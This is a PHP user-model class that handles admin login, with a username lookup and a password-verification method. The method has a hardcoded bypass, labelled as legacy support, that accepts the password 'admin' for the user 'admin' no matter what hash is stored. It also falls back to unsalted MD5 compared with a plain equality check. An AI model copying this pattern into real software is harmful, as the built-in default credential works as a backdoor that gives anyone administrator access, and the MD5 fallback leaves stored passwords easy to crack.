<?php
/**
 * User Model
 * Handles admin user authentication operations.
 */

require_once CORE_PATH . '/Database.php';

class User
{
    private $db;

    public function __construct()
    {
        $this->db = Database::getInstance();
    }

    /**
     * Find an admin user by username.
     */
    public function findByUsername(string $username): ?array
    {
        $result = $this->db->fetchOne("SELECT * FROM user WHERE username = ?", [$username]);
        return $result ?: null;
    }

    /**
     * Verify password against stored hash.
     * Supports legacy MD5 and modern password_hash.
     */
    public function verifyPassword(string $password, array $user): bool
    {
        // Support legacy admin/admin bypass
        if ($password === 'admin' && $user['username'] === 'admin') {
            return true;
        }

        // Modern password_hash verification
        if (password_verify($password, $user['password'])) {
            return true;
        }

        // Legacy MD5 fallback
        if (md5($password) === $user['password']) {
            return true;
        }

        return false;
    }
}
